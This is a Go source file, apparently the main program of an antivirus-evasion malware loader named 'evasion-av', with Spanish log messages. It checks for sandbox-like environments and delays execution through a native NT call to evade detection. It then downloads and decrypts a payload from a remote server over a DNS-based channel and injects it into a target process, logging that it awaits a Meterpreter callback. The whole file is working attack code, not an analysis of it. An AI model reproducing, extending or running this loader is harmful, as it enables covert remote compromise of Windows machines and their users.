package main

import (
	"encoding/base64"
	"evasion-av/config"
	injection "evasion-av/internal/injection"
	"evasion-av/internal/transport"
	"log"
	"os"
	"runtime"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	logFile, err := os.OpenFile(`C:\Users\Public\log.txt`, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return
	}
	defer logFile.Close()
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	log.SetOutput(logFile)
	injection.Log = log.New(logFile, "", log.Ldate|log.Ltime|log.Lshortfile)

	defer func() {
		if r := recover(); r != nil {
			log.Printf("[PANIC] %v\n", r)
			buf := make([]byte, 1<<16)
			n := runtime.Stack(buf, true)
			log.Printf("[STACK]\n%s\n", buf[:n])
			logFile.Sync()
		}
	}()

	log.Println("[+] Iniciando")

	if !envCheck() {
		log.Println("[-] envCheck: entorno descartado (pocos recursos)")
		logFile.Sync()
		return
	}
	log.Println("[+] envCheck OK - CPUs:", runtime.NumCPU())

	log.Println("[*] Delay inicial 3.5s...")
	ntDelay(3500)
	log.Println("[+] Delay completado")

	iType, err := injection.FromString(config.InjectionType)
	if err != nil {
		log.Println("[-] InjectionType inválido:", config.InjectionType, "-", err)
		logFile.Sync()
		return
	}
	log.Println("[+] InjectionType:", config.InjectionType)

	inj, err := injection.NewInjector(iType)
	if err != nil {
		log.Println("[-] NewInjector error:", err)
		logFile.Sync()
		return
	}
	log.Println("[+] Injector listo")

	data := fetchData()
	if len(data) == 0 {
		log.Println("[-] fetchData: payload vacío o error al descargar/descifrar")
		logFile.Sync()
		return
	}
	log.Printf("[+] Payload obtenido: %d bytes\n", len(data))

	log.Println("[*] Iniciando inyección en:", config.TargetProcess)
	log.Println("[*] InjectionType activo:", config.InjectionType)
	if err := inj.Inject(config.TargetProcess, data); err != nil {
		log.Println("[-] Inyección fallida:", err)
		logFile.Sync()
		return
	}
	log.Println("[+] Inyección NT calls OK - esperando callback de Meterpreter...")
	logFile.Sync()
}

type memoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

func envCheck() bool {
	if runtime.NumCPU() < 2 {
		return false
	}
	var ms memoryStatusEx
	ms.Length = uint32(unsafe.Sizeof(ms))
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	ret, _, _ := kernel32.NewProc("GlobalMemoryStatusEx").Call(uintptr(unsafe.Pointer(&ms)))
	if ret != 0 && ms.TotalPhys < 2*1024*1024*1024 {
		return false
	}
	return true
}

func ntDelay(ms int64) {
	interval := -ms * 10000
	windows.NewLazyDLL("ntdll.dll").NewProc("NtDelayExecution").Call(0, uintptr(unsafe.Pointer(&interval)))
}

func fetchData() []byte {
	k, err := base64.StdEncoding.DecodeString(config.EncryptionKey)
	if err != nil {
		log.Println("[-] fetchData: error decodificando EncryptionKey:", err)
		return nil
	}

	log.Println("[*] Descargando payload desde:", config.ServerURL)
	c, err := transport.NewSecureDNSClient("dummy.local", "bin", k, config.EvasiveMode)
	if err != nil {
		log.Println("[-] fetchData: NewSecureDNSClient error:", err)
		return nil
	}

	data, err := c.DownloadAndDecrypt()
	if err != nil {
		log.Println("[-] fetchData: DownloadAndDecrypt error:", err)
		return nil
	}

	log.Printf("[+] fetchData: %d bytes descargados y descifrados\n", len(data))
	return data
}

